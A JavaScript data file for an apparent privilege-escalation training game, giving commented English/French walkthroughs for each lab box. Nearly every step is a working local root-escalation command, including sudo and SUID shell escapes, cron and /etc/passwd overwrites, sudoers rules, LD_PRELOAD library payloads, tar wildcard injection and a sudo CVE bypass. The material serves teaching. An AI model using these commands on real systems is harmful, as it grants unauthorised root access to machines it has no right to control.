// walkthrough.js — "Explanation mode" data: a fully worked, commented solution
// per built-in box (id 1..27). Separate from levels.js on purpose: it never
// touches win-condition logic or scoring, it's pure pedagogy, togglable at
// will, and does not consume a hint slot (S-rank is unaffected).
// Keyed by numeric level id — custom boxes (id >= GAME_CUSTOM.NEXT_ID_BASE)
// intentionally have no entry here; the UI falls back to a "not available"
// message for those.
window.WALKTHROUGHS = {
    1: [ // SUID find
        { cmd: 'find / -perm -4000 2>/dev/null', explain: {
            en: 'List every SUID binary on the system. The "4000" bit means the program runs as its owner (root) no matter who launches it.',
            fr: 'Liste tous les binaires SUID du système. Le bit "4000" signifie que le programme s\'exécute avec les droits de son propriétaire (root), peu importe qui le lance.' } },
        { cmd: 'ls -la /usr/bin/find', explain: {
            en: '/usr/bin/find is owned by root and carries the SUID bit (rwsr-xr-x) — that "s" is the tell.',
            fr: '/usr/bin/find appartient à root et porte le bit SUID (rwsr-xr-x) — ce "s" est l\'indice.' } },
        { cmd: 'find . -exec /bin/sh -p \\;', explain: {
            en: 'find\'s -exec runs an arbitrary program. GTFOBins lists it for exactly this: the spawned shell inherits find\'s root privileges (-p keeps the elevated UID instead of dropping it).',
            fr: '-exec de find lance un programme arbitraire. GTFOBins le référence pour ça : le shell lancé hérite des droits root de find (-p conserve l\'UID élevé au lieu de le laisser tomber).' } }
    ],
    2: [ // cron writable script
        { cmd: 'cat /etc/crontab', explain: {
            en: 'System-wide cron jobs run as whatever user is listed on their line — here root runs /opt/backup.sh every minute.',
            fr: 'Les tâches cron système s\'exécutent avec l\'utilisateur indiqué sur leur ligne — ici root lance /opt/backup.sh toutes les minutes.' } },
        { cmd: 'ls -la /opt/backup.sh', explain: {
            en: 'Mode 777: the script root executes is writable by literally anyone. Whoever edits it decides what root runs next.',
            fr: 'Mode 777 : le script exécuté par root est modifiable par n\'importe qui. Celui qui l\'édite décide de ce que root exécutera ensuite.' } },
        { cmd: 'echo "cp /bin/sh /tmp/rootsh; chmod +s /tmp/rootsh" > /opt/backup.sh', explain: {
            en: 'Replace the payload: next time cron fires it as root, it drops a copy of /bin/sh with the SUID bit set.',
            fr: 'On remplace le payload : à la prochaine exécution par cron en root, il dépose une copie de /bin/sh avec le bit SUID posé.' } },
        { cmd: 'wait', explain: {
            en: 'Let the simulated cron tick pass. Once it fires, /tmp/rootsh exists and running it gives a root shell.',
            fr: 'On laisse passer le tic cron simulé. Une fois déclenché, /tmp/rootsh existe et le lancer donne un shell root.' } }
    ],
    3: [ // cap_setuid python3
        { cmd: 'getcap -r / 2>/dev/null', explain: {
            en: 'SUID audit came up empty — Linux capabilities are a second, finer-grained way to hand a binary partial root powers without a full SUID bit.',
            fr: 'L\'audit SUID est vide — les capabilities Linux sont une seconde façon, plus fine, de donner à un binaire des pouvoirs root partiels sans bit SUID complet.' } },
        { cmd: '(read output) python3 = cap_setuid+ep', explain: {
            en: 'python3 was granted cap_setuid. "+ep" means it\'s effective and permitted — the interpreter can call setuid() directly from a script.',
            fr: 'python3 a reçu cap_setuid. "+ep" veut dire effective et permitted — l\'interpréteur peut appeler setuid() directement depuis un script.' } },
        { cmd: 'python3 -c \'import os; os.setuid(0); os.system("/bin/sh")\'', explain: {
            en: 'os.setuid(0) switches the process UID to root using the capability, then os.system() spawns a shell that keeps it.',
            fr: 'os.setuid(0) fait passer l\'UID du processus à root grâce à la capability, puis os.system() lance un shell qui la conserve.' } }
    ],
    4: [ // PATH hijack
        { cmd: 'find / -perm -4000 2>/dev/null', explain: {
            en: 'Enumerate SUID binaries as usual — /usr/local/bin/status stands out as a non-standard one.',
            fr: 'On énumère les binaires SUID comme d\'habitude — /usr/local/bin/status ressort comme non standard.' } },
        { cmd: 'strings /usr/local/bin/status', explain: {
            en: 'The binary calls "ps" by bare name, not an absolute path like /bin/ps — it trusts whatever PATH resolves "ps" to.',
            fr: 'Le binaire appelle "ps" par son nom nu, pas par un chemin absolu comme /bin/ps — il fait confiance à ce que PATH résout pour "ps".' } },
        { cmd: "echo '#!/bin/sh' > /tmp/ps && echo '/bin/sh' >> /tmp/ps && chmod +x /tmp/ps", explain: {
            en: 'Plant a fake "ps" that just spawns a shell instead of the real process listing.',
            fr: 'On plante un faux "ps" qui se contente de lancer un shell au lieu de la vraie liste de processus.' } },
        { cmd: 'export PATH=/tmp:$PATH && /usr/local/bin/status', explain: {
            en: 'Put /tmp first in PATH, then run the SUID helper: it resolves "ps" to our fake one and executes it as root.',
            fr: 'On place /tmp en tête de PATH, puis on lance le binaire SUID : il résout "ps" vers notre faux binaire et l\'exécute en root.' } }
    ],
    5: [ // sudo vim
        { cmd: 'sudo -l', explain: {
            en: 'Lists what the current user is allowed to run as root without further questions — the sysadmin gave NOPASSWD access to /usr/bin/vim.',
            fr: 'Liste ce que l\'utilisateur courant peut lancer en root sans autre question — l\'admin a donné un accès NOPASSWD à /usr/bin/vim.' } },
        { cmd: "sudo vim -c ':!/bin/sh'", explain: {
            en: 'vim\'s :! runs a shell command from inside the editor. Since vim itself is running as root (via sudo), the spawned shell is root too.',
            fr: 'Le :! de vim lance une commande shell depuis l\'éditeur. vim lui-même tournant en root (via sudo), le shell lancé l\'est aussi.' } }
    ],
    6: [ // passwd write
        { cmd: 'ls -la /etc/passwd', explain: {
            en: 'Mode 666 — writable by any user, which should never happen: /etc/passwd defines every account on the box.',
            fr: 'Mode 666 — modifiable par n\'importe qui, ce qui ne devrait jamais arriver : /etc/passwd définit tous les comptes de la machine.' } },
        { cmd: "echo 'r00t::0:0:pwned:/root:/bin/bash' >> /etc/passwd", explain: {
            en: 'Append a line with an empty password field and UID/GID 0 — an empty second field means "no password required" to su into it.',
            fr: 'On ajoute une ligne avec un champ mot de passe vide et UID/GID 0 — un deuxième champ vide signifie "aucun mot de passe requis" pour un su.' } },
        { cmd: 'su r00t', explain: {
            en: 'Switch to the account just created. UID 0 makes it root in every way that matters, regardless of the username.',
            fr: 'On bascule vers le compte tout juste créé. L\'UID 0 en fait un root à tous égards, quel que soit le nom d\'utilisateur.' } }
    ],
    7: [ // sudo awk
        { cmd: 'sudo -l', explain: {
            en: 'Check what can be run as root without a password — awk is allowed here.',
            fr: 'On vérifie ce qui peut être lancé en root sans mot de passe — awk est autorisé ici.' } },
        { cmd: "sudo awk 'BEGIN{system(\"/bin/sh\")}'", explain: {
            en: 'awk\'s BEGIN block runs before any input is read. system() shells out from inside it, inheriting awk\'s root privileges from sudo.',
            fr: 'Le bloc BEGIN d\'awk s\'exécute avant toute lecture d\'entrée. system() ouvre un shell depuis là, héritant des droits root d\'awk via sudo.' } }
    ],
    8: [ // pwnkit
        { cmd: 'cat HINT.txt', explain: {
            en: 'No SUID, no sudo, no capabilities to abuse this time — the note points at the polkit/pkexec version, which matches CVE-2021-4034 (PwnKit).',
            fr: 'Pas de SUID, pas de sudo, pas de capability à exploiter cette fois — la note pointe vers la version de polkit/pkexec, qui correspond à CVE-2021-4034 (PwnKit).' } },
        { cmd: 'ls -la', explain: {
            en: 'A pre-compiled proof-of-concept for that CVE is sitting right in the home directory.',
            fr: 'Un proof-of-concept déjà compilé pour ce CVE se trouve directement dans le répertoire personnel.' } },
        { cmd: './pwnkit', explain: {
            en: 'pkexec mishandles argument count when argc is 0, letting the exploit make it execute attacker-controlled code as root.',
            fr: 'pkexec gère mal le nombre d\'arguments quand argc vaut 0, ce qui permet à l\'exploit de lui faire exécuter du code contrôlé par l\'attaquant en root.' } }
    ],
    9: [ // credential reuse chain
        { cmd: 'cat /opt/app/config.php', explain: {
            en: 'A web app config file, readable by the low-priv user, leaks a database username and a plaintext password.',
            fr: 'Un fichier de config d\'appli web, lisible par l\'utilisateur peu privilégié, laisse fuiter un nom d\'utilisateur et un mot de passe en clair.' } },
        { cmd: 'su svc', explain: {
            en: 'That leaked password is reused as the login for the "svc" system account — password reuse turns one leak into a foothold.',
            fr: 'Ce mot de passe fuité est réutilisé comme mot de passe du compte système "svc" — la réutilisation transforme une fuite en pied à terre.' } },
        { cmd: 'sudo -l', explain: {
            en: 'As svc, check sudo rights — the service account was over-granted the ability to run bash as root.',
            fr: 'En svc, on vérifie les droits sudo — le compte de service a reçu bien trop de droits : lancer bash en root.' } },
        { cmd: 'sudo bash', explain: {
            en: 'Cash in the over-privilege for a full root shell — the classic enumerate → lateral move → sudo abuse chain.',
            fr: 'On encaisse ce sur-privilège pour un shell root complet — la chaîne classique énumération → mouvement latéral → abus de sudo.' } }
    ],
    10: [ // docker group
        { cmd: 'id', explain: {
            en: 'Membership in the "docker" group is a well-known privesc: it grants control of a daemon that itself runs as root.',
            fr: 'Faire partie du groupe "docker" est un privesc bien connu : il donne le contrôle d\'un démon qui tourne lui-même en root.' } },
        { cmd: 'docker run -v /:/mnt -it alpine chroot /mnt sh', explain: {
            en: 'Bind-mount the entire host filesystem into a throwaway container, then chroot into it — the shell now sees the host as "/" with root privileges, because the daemon granted that mount as root.',
            fr: 'On monte tout le système de fichiers hôte dans un conteneur jetable, puis on fait chroot dedans — le shell voit désormais l\'hôte comme "/" avec les droits root, car le démon a accordé ce montage en root.' } }
    ],
    11: [ // LD_PRELOAD env_keep
        { cmd: 'sudo -l', explain: {
            en: 'Look for "env_keep+=LD_PRELOAD" alongside the allowed NOPASSWD command — sudo normally scrubs LD_PRELOAD, but this Defaults line keeps it.',
            fr: 'On cherche "env_keep+=LD_PRELOAD" à côté de la commande NOPASSWD autorisée — sudo nettoie normalement LD_PRELOAD, mais cette ligne Defaults le conserve.' } },
        { cmd: 'echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c && gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c', explain: {
            en: 'Write and compile a tiny shared library whose _init() constructor runs as soon as the library is loaded — before the target program\'s own code.',
            fr: 'On écrit et compile une petite bibliothèque partagée dont le constructeur _init() s\'exécute dès son chargement — avant le propre code du programme cible.' } },
        { cmd: 'sudo LD_PRELOAD=/tmp/x.so apache2ctl', explain: {
            en: 'sudo runs apache2ctl as root and keeps LD_PRELOAD, so the loader injects our .so first — its _init() calls setuid(0)/system() before apache2ctl even starts.',
            fr: 'sudo lance apache2ctl en root et conserve LD_PRELOAD, donc le loader injecte d\'abord notre .so — son _init() appelle setuid(0)/system() avant même qu\'apache2ctl ne démarre.' } }
    ],
    12: [ // wildcard tar
        { cmd: 'cat /etc/crontab', explain: {
            en: 'root runs "cd /home/player/share && tar -czf /var/backups/share.tar.gz *" every minute — the wildcard is the weak point.',
            fr: 'root lance "cd /home/player/share && tar -czf /var/backups/share.tar.gz *" chaque minute — le joker est le point faible.' } },
        { cmd: "cd /home/player/share && echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > runme.sh", explain: {
            en: 'Prepare a payload script first — it will drop a SUID root copy of bash once executed.',
            fr: 'On prépare d\'abord un script payload — il déposera une copie SUID root de bash une fois exécuté.' } },
        { cmd: "touch ./--checkpoint=1 && touch './--checkpoint-action=exec=sh runme.sh'", explain: {
            en: 'The shell expands "*" to every filename in the directory, and tar parses filenames starting with "--" as options — --checkpoint-action=exec=... makes tar execute our script.',
            fr: 'Le shell développe "*" en tous les noms de fichiers du dossier, et tar interprète les noms commençant par "--" comme des options — --checkpoint-action=exec=... fait exécuter notre script par tar.' } },
        { cmd: 'wait', explain: {
            en: 'Let the root cron tick run tar on this directory. It unwittingly executes our script as root.',
            fr: 'On laisse le tic cron root exécuter tar sur ce dossier. Il exécute sans le savoir notre script en root.' } }
    ],
    13: [ // ssh key
        { cmd: 'ls -la /opt/backup', explain: {
            en: 'A backup job left an id_rsa file lying around, and it\'s world-readable — private keys should never be.',
            fr: 'Une tâche de sauvegarde a laissé traîner un fichier id_rsa, lisible par tout le monde — une clé privée ne devrait jamais l\'être.' } },
        { cmd: 'cat /opt/backup/id_rsa', explain: {
            en: 'That\'s root\'s own private SSH key — /root/.ssh/authorized_keys already trusts its matching public half.',
            fr: 'C\'est la clé SSH privée de root elle-même — /root/.ssh/authorized_keys fait déjà confiance à sa moitié publique.' } },
        { cmd: 'ssh -i /opt/backup/id_rsa root@localhost', explain: {
            en: 'Authenticate as root directly with the leaked key — no password, no exploit, just a permission mistake.',
            fr: 'On s\'authentifie directement en root avec la clé fuitée — pas de mot de passe, pas d\'exploit, juste une erreur de permission.' } }
    ],
    14: [ // sudoers.d writable
        { cmd: 'ls -la /etc/sudoers.d', explain: {
            en: 'sudo reads and merges every file dropped in this directory — and it\'s world-writable here, which it never should be.',
            fr: 'sudo lit et fusionne chaque fichier déposé dans ce dossier — et il est modifiable par tous ici, ce qui ne devrait jamais être le cas.' } },
        { cmd: "echo 'player ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/pwn", explain: {
            en: 'Drop a rule granting the current user unrestricted root access with no password — sudo will pick it up immediately.',
            fr: 'On dépose une règle donnant à l\'utilisateur courant un accès root illimité sans mot de passe — sudo la prendra en compte immédiatement.' } },
        { cmd: 'sudo bash', explain: {
            en: 'Cash in the rule just written for a root shell.',
            fr: 'On encaisse la règle qu\'on vient d\'écrire pour obtenir un shell root.' } }
    ],
    15: [ // ld.so.preload writable
        { cmd: 'ls -la /etc/ld.so.preload', explain: {
            en: 'This file lists shared libraries the dynamic linker force-loads into every dynamically linked program — SUID root ones included — and it\'s world-writable.',
            fr: 'Ce fichier liste des bibliothèques que le linker dynamique force-charge dans tous les programmes liés dynamiquement — y compris les SUID root — et il est modifiable par tous.' } },
        { cmd: 'echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/x.c && gcc -shared -fPIC -nostartfiles -o /tmp/x.so /tmp/x.c && echo /tmp/x.so > /etc/ld.so.preload', explain: {
            en: 'Build a library whose constructor pops a root shell, then register it globally by writing its path into ld.so.preload.',
            fr: 'On construit une bibliothèque dont le constructeur ouvre un shell root, puis on l\'enregistre globalement en écrivant son chemin dans ld.so.preload.' } },
        { cmd: '/usr/bin/passwd', explain: {
            en: 'Run any SUID root binary — the linker preloads our .so into it first, its constructor fires, and we get root before passwd even starts.',
            fr: 'On lance n\'importe quel binaire SUID root — le linker y précharge d\'abord notre .so, son constructeur se déclenche, et on obtient root avant même que passwd ne démarre.' } }
    ],
    16: [ // sudo find
        { cmd: 'sudo -l', explain: {
            en: 'Same trick as box-01, different door: no SUID bit needed this time, sudo grants find directly.',
            fr: 'Même astuce que la box-01, porte différente : pas besoin de bit SUID cette fois, sudo autorise find directement.' } },
        { cmd: 'sudo find . -exec /bin/sh \\;', explain: {
            en: 'The GTFOBins exploit is identical — only the delivery mechanism (sudo instead of SUID) changed.',
            fr: 'L\'exploit GTFOBins est identique — seul le mécanisme de délivrance a changé (sudo au lieu de SUID).' } }
    ],
    17: [ // sudo env
        { cmd: 'sudo -l', explain: {
            en: 'env is allowed as root — its entire job is running a command inside a possibly-modified environment.',
            fr: 'env est autorisé en root — son travail est justement de lancer une commande dans un environnement éventuellement modifié.' } },
        { cmd: 'sudo env /bin/sh', explain: {
            en: 'Skip the environment tweak entirely and just hand env a shell to run — it executes it as root, since that\'s who sudo made env run as.',
            fr: 'On saute totalement la modification d\'environnement et on donne directement un shell à lancer à env — il l\'exécute en root, puisque c\'est en tant que root que sudo a fait tourner env.' } }
    ],
    18: [ // sudo python3
        { cmd: 'sudo -l', explain: {
            en: 'python3 is allowed as root — any scripting interpreter that can shell out is effectively a root shell in disguise.',
            fr: 'python3 est autorisé en root — tout interpréteur capable d\'ouvrir un shell est en réalité un shell root déguisé.' } },
        { cmd: 'sudo python3 -c \'import os; os.system("/bin/sh")\'', explain: {
            en: 'os.system() shells out from inside the interpreter, which sudo is already running as root.',
            fr: 'os.system() ouvre un shell depuis l\'interpréteur, que sudo fait déjà tourner en root.' } }
    ],
    19: [ // sudo less
        { cmd: 'sudo -l', explain: {
            en: 'less is allowed as root — pagers like less, more and man support a "!command" shell-escape by design.',
            fr: 'less est autorisé en root — les pagers comme less, more et man supportent par conception un échappement shell "!commande".' } },
        { cmd: 'sudo less !/bin/sh', explain: {
            en: 'In a real terminal you\'d open less then press "!" and type the command; the escaped command runs as root because less itself is running as root under sudo.',
            fr: 'Dans un vrai terminal on ouvrirait less puis on taperait "!" suivi de la commande ; la commande échappée s\'exécute en root car less lui-même tourne en root sous sudo.' } }
    ],
    20: [ // sudo tee
        { cmd: 'sudo -l', explain: {
            en: '/etc/passwd is locked down this time — a plain "echo >> /etc/passwd" will fail — but tee is allowed as root.',
            fr: '/etc/passwd est verrouillé cette fois — un simple "echo >> /etc/passwd" échouera — mais tee est autorisé en root.' } },
        { cmd: "echo 'r00t::0:0::/root:/bin/bash' | sudo tee -a /etc/passwd", explain: {
            en: 'tee has no shell to escape from — it just copies stdin to the file it\'s given. Running it under sudo makes that write happen as root, so it can append to a file the user normally can\'t touch.',
            fr: 'tee n\'a pas de shell à échapper — il copie simplement l\'entrée standard vers le fichier donné. Le lancer sous sudo fait de cette écriture une écriture root, capable de modifier un fichier normalement hors de portée de l\'utilisateur.' } },
        { cmd: 'su r00t', explain: {
            en: 'Same passwordless-root trick as box-06, delivered through a different write primitive.',
            fr: 'Même astuce de root sans mot de passe qu\'à la box-06, livrée via un autre moyen d\'écriture.' } }
    ],
    21: [ // shadow crack
        { cmd: 'getcap -r / 2>/dev/null', explain: {
            en: 'SUID audit and sudo -l are both clean — capabilities strike again, this time cap_dac_read_search on python3.',
            fr: 'L\'audit SUID et sudo -l sont tous deux vides — les capabilities frappent encore, cette fois cap_dac_read_search sur python3.' } },
        { cmd: 'python3 -c "print(open(\'/etc/shadow\').read())"', explain: {
            en: 'cap_dac_read_search bypasses the usual owner/mode read checks (DAC) at the kernel level, so a plain open()/read() pulls the password hashes straight out of a file the user could never normally open.',
            fr: 'cap_dac_read_search contourne au niveau noyau les vérifications habituelles de lecture (DAC) liées au propriétaire/mode, donc un simple open()/read() extrait directement les empreintes de mots de passe d\'un fichier que l\'utilisateur ne pourrait jamais ouvrir normalement.' } },
        { cmd: 'john /tmp/shadow.copy', explain: {
            en: 'With the hash in hand, crack it offline against a wordlist to recover root\'s actual password.',
            fr: 'Avec l\'empreinte en main, on la casse hors ligne avec une wordlist pour récupérer le vrai mot de passe de root.' } },
        { cmd: 'su root', explain: {
            en: 'Log in as root with the cracked password.',
            fr: 'On se connecte en root avec le mot de passe cassé.' } }
    ],
    22: [ // LD_LIBRARY_PATH
        { cmd: 'sudo -l', explain: {
            en: 'Look at env_keep closely — this time it\'s LD_LIBRARY_PATH that sudo keeps, not LD_PRELOAD.',
            fr: 'On regarde bien env_keep — cette fois c\'est LD_LIBRARY_PATH que sudo conserve, pas LD_PRELOAD.' } },
        { cmd: 'cat /usr/local/bin/README.txt', explain: {
            en: 'The allowed program depends on a shared library, libagent.so.1, without an absolute path — LD_LIBRARY_PATH adds extra directories the linker searches for it.',
            fr: 'Le programme autorisé dépend d\'une bibliothèque partagée, libagent.so.1, sans chemin absolu — LD_LIBRARY_PATH ajoute des dossiers supplémentaires où le linker la cherche.' } },
        { cmd: 'echo \'void _init(){setuid(0);system("/bin/sh");}\' > /tmp/libagent.so.1.c && gcc -shared -fPIC -nostartfiles -o /tmp/libagent.so.1 /tmp/libagent.so.1.c', explain: {
            en: 'Unlike LD_PRELOAD, the planted file must match the exact library name the target is looking for — a same-named malicious build anywhere on the path will do.',
            fr: 'Contrairement à LD_PRELOAD, le fichier planté doit correspondre exactement au nom de la bibliothèque recherchée par la cible — un binaire malveillant au même nom, n\'importe où dans le chemin, suffit.' } },
        { cmd: 'sudo LD_LIBRARY_PATH=/tmp /usr/local/bin/backup-agent', explain: {
            en: 'sudo runs the agent as root and keeps LD_LIBRARY_PATH, so the linker finds our fake library first and its constructor fires as root.',
            fr: 'sudo lance l\'agent en root et conserve LD_LIBRARY_PATH, donc le linker trouve d\'abord notre fausse bibliothèque et son constructeur se déclenche en root.' } }
    ],
    23: [ // NFS no_root_squash
        { cmd: 'showmount -e', explain: {
            en: '/srv/backups resists direct access from the local shell (mode 750, root-owned) — check what\'s exported over NFS instead.',
            fr: '/srv/backups résiste à un accès direct depuis le shell local (mode 750, appartenant à root) — on regarde plutôt ce qui est exporté en NFS.' } },
        { cmd: 'cat /etc/exports', explain: {
            en: 'The export is shared rw with no_root_squash. Normally NFS "squashes" a mounting client\'s root (UID 0) down to an unprivileged nobody — no_root_squash disables that safeguard entirely.',
            fr: 'L\'export est partagé en rw avec no_root_squash. Normalement, NFS "squashe" le root (UID 0) d\'un client montant vers un utilisateur non privilégié — no_root_squash désactive complètement cette protection.' } },
        { cmd: 'mount -t nfs box-23:/srv/backups /mnt', explain: {
            en: 'Mount the export locally. From here on, the export\'s NFS rules govern access — not the directory\'s local Unix permissions.',
            fr: 'On monte l\'export localement. À partir de là, ce sont les règles NFS de l\'export qui régissent l\'accès — pas les permissions Unix locales du dossier.' } },
        { cmd: 'touch /srv/backups/rootbash && chmod u+s /srv/backups/rootbash', explain: {
            en: 'Because the client\'s root is trusted, files created here are genuinely root-owned — set the SUID bit on a shell copy.',
            fr: 'Le root du client étant fait confiance, les fichiers créés ici appartiennent réellement à root — on pose le bit SUID sur une copie de shell.' } },
        { cmd: '/srv/backups/rootbash', explain: {
            en: 'Run it: a real SUID-root binary, planted through a permission model NFS itself chose to disable.',
            fr: 'On le lance : un vrai binaire SUID-root, planté grâce à un modèle de permissions que NFS lui-même a choisi de désactiver.' } }
    ],
    24: [ // sudo perl
        { cmd: 'sudo -l', explain: {
            en: 'perl is allowed as root — like python3 or ruby, it\'s a general-purpose interpreter that can shell out on command.',
            fr: 'perl est autorisé en root — comme python3 ou ruby, c\'est un interpréteur généraliste capable de lancer un shell sur demande.' } },
        { cmd: "sudo perl -e 'exec \"/bin/sh\";'", explain: {
            en: 'perl -e runs an inline expression. exec replaces the current (already-root, thanks to sudo) process with /bin/sh — the shell inherits that identity outright.',
            fr: 'perl -e exécute une expression en ligne. exec remplace le processus courant (déjà root, grâce à sudo) par /bin/sh — le shell hérite directement de cette identité.' } }
    ],
    25: [ // sudo node
        { cmd: 'sudo -l', explain: {
            en: 'node is allowed as root — same family of risk as any scripting runtime with sudo rights.',
            fr: 'node est autorisé en root — même famille de risque que n\'importe quel runtime de script avec des droits sudo.' } },
        { cmd: 'sudo node -e \'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})\'', explain: {
            en: 'node -e runs an inline script. child_process.spawn() forks /bin/sh as a child of the (root, under sudo) node process, wiring its stdio straight to the terminal.',
            fr: 'node -e exécute un script en ligne. child_process.spawn() fork /bin/sh comme enfant du processus node (root, sous sudo), en reliant ses flux stdio directement au terminal.' } }
    ],
    26: [ // sudoedit EDITOR hijack
        { cmd: 'sudo -l', explain: {
            en: 'Only sudoedit /etc/motd is allowed — but note the env_keep line for EDITOR. sudoedit never runs the target file itself as root.',
            fr: 'Seul sudoedit /etc/motd est autorisé — mais remarque la ligne env_keep pour EDITOR. sudoedit ne lance jamais le fichier cible lui-même en root.' } },
        { cmd: "echo '#!/bin/sh' > /tmp/pwn.sh && echo 'exec /bin/sh' >> /tmp/pwn.sh && chmod +x /tmp/pwn.sh", explain: {
            en: 'Write a one-line "editor" that just execs a shell the moment it\'s launched.',
            fr: 'On écrit un "éditeur" d\'une ligne qui se contente de exec un shell dès qu\'il est lancé.' } },
        { cmd: 'sudo EDITOR=/tmp/pwn.sh -e /etc/motd', explain: {
            en: 'sudoedit copies /etc/motd somewhere writable and opens $EDITOR on that copy, as root. Since EDITOR is preserved and points at our script, that script runs as root instead of a real editor.',
            fr: 'sudoedit copie /etc/motd dans un emplacement modifiable et ouvre $EDITOR sur cette copie, en root. EDITOR étant conservée et pointant vers notre script, c\'est ce script qui s\'exécute en root, pas un vrai éditeur.' } }
    ],
    27: [ // cap_dac_override write bypass
        { cmd: 'getcap -r / 2>/dev/null', explain: {
            en: 'python3 has cap_dac_override — the write-capable sibling of cap_dac_read_search (seen on another box), which only ever bypasses reads.',
            fr: 'python3 a cap_dac_override — le pendant capable d\'écrire de cap_dac_read_search (vu sur une autre box), qui ne contourne jamais que la lecture.' } },
        { cmd: "python3 -c \"open('/etc/passwd','a').write('pwnd::0:0::/root:/bin/bash\\n')\"", explain: {
            en: '/etc/passwd is root-owned, mode 644 — a normal process can\'t append to it. cap_dac_override makes python3 ignore that check entirely, so the append succeeds and drops a UID-0 line with an empty password field.',
            fr: '/etc/passwd appartient à root, mode 644 — un processus normal ne peut pas y ajouter de ligne. cap_dac_override fait ignorer cette vérification à python3, donc l\'ajout réussit et dépose une ligne UID 0 avec un champ mot de passe vide.' } },
        { cmd: 'su pwnd', explain: {
            en: 'Same passwordless-root trick as box-06/box-20, delivered through a capability instead of a permission or sudo misconfiguration.',
            fr: 'Même astuce de root sans mot de passe qu\'aux box-06/box-20, livrée via une capability plutôt qu\'une permission ou une mauvaise config sudo.' } }
    ],
    28: [ // CVE-2019-14287 sudo negative-uid bypass
        { cmd: 'sudo -l', explain: {
            en: '(ALL, !root) NOPASSWD: /bin/bash — allowed to run bash as anyone except root. Looks like a safe restriction.',
            fr: '(ALL, !root) NOPASSWD: /bin/bash — autorisé à lancer bash en tant que n\'importe qui sauf root. Ça ressemble à une restriction sûre.' } },
        { cmd: 'sudo -u root /bin/bash', explain: {
            en: 'Refused, as expected — the exclusion does match the literal name "root".',
            fr: 'Refusé, comme attendu — l\'exclusion attrape bien le nom littéral "root".' } },
        { cmd: 'sudo -u#-1 /bin/bash', explain: {
            en: 'CVE-2019-14287: on sudo < 1.8.28, a numeric target is never string-compared against the "!root" exclusion, but -1 still resolves to uid 0 once cast to uid_t by the actual setresuid() call. The exclusion never fires, and the shell comes up as root anyway.',
            fr: 'CVE-2019-14287 : sur sudo < 1.8.28, une cible numérique n\'est jamais comparée en chaîne à l\'exclusion "!root", mais -1 se résout quand même en uid 0 une fois casté en uid_t par le vrai appel setresuid(). L\'exclusion ne se déclenche jamais, et le shell arrive en root malgré tout.' } }
    ],
    29: [ // sudo systemd-run
        { cmd: 'sudo -l', explain: {
            en: 'systemd-run is allowed as root, nothing else. It doesn\'t look like a shell or an interpreter, so it\'s easy to assume it\'s safe.',
            fr: 'systemd-run est autorisé en root, rien d\'autre. Ça ne ressemble ni à un shell ni à un interpréteur, donc on pourrait croire que c\'est sûr.' } },
        { cmd: 'sudo systemd-run /bin/sh', explain: {
            en: 'systemd-run doesn\'t execute anything itself — it asks the system manager (PID 1, always root) to schedule the command as a transient unit. The manager runs it as root regardless of who asked, so the shell comes back with full privileges.',
            fr: 'systemd-run n\'exécute rien lui-même — il demande au gestionnaire système (PID 1, toujours root) de planifier la commande comme une unité transitoire. Le gestionnaire l\'exécute en root peu importe qui l\'a demandé, donc le shell revient avec les pleins privilèges.' } }
    ],
    30: [ // sudo apt-get Pre-Invoke hook
        { cmd: 'sudo -l', explain: {
            en: 'Only apt-get is allowed — a package manager, not an interpreter. Seems safe on the surface.',
            fr: "Seul apt-get est autorisé — un gestionnaire de paquets, pas un interpréteur. Ça semble sûr en apparence." } },
        { cmd: 'sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh', explain: {
            en: 'apt-get -o sets an arbitrary config key for this run. APT::Update::Pre-Invoke is a hook meant for maintenance scripts — apt-get runs its value as a shell command before touching anything else, and since apt-get itself is root under sudo, that hook is too.',
            fr: 'apt-get -o fixe une clé de config arbitraire pour cette exécution. APT::Update::Pre-Invoke est un hook prévu pour des scripts de maintenance — apt-get exécute sa valeur comme une commande shell avant de toucher à quoi que ce soit d\'autre, et comme apt-get lui-même est root sous sudo, ce hook l\'est aussi.' } }
    ]
};
